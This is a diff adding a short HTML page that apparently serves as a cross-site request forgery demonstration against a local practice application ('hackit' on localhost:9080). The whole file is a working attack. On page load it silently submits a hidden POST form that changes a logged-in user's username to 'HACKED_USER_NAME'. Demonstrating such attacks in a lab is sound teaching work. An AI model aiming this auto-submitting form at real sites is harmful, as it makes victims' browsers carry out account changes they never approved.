@@ -1,0 +1,19 @@
+<html>
+<head>
+</head>
+<body onload="submitForm()">
+
+<form id="form" name="form" action="http://localhost:9080/hackit/updateUser" method="POST">
+    <input type="text" name="newUserName" value="HACKED_USER_NAME"/> <br>
+    <input type="submit" value="Save new username" />
+</form>
+
+<script type="text/javascript">
+	function submitForm() {
+		var form = document.getElementById("form");
+		form.submit();
+	}
+</script>
+
+</body>
+</html>
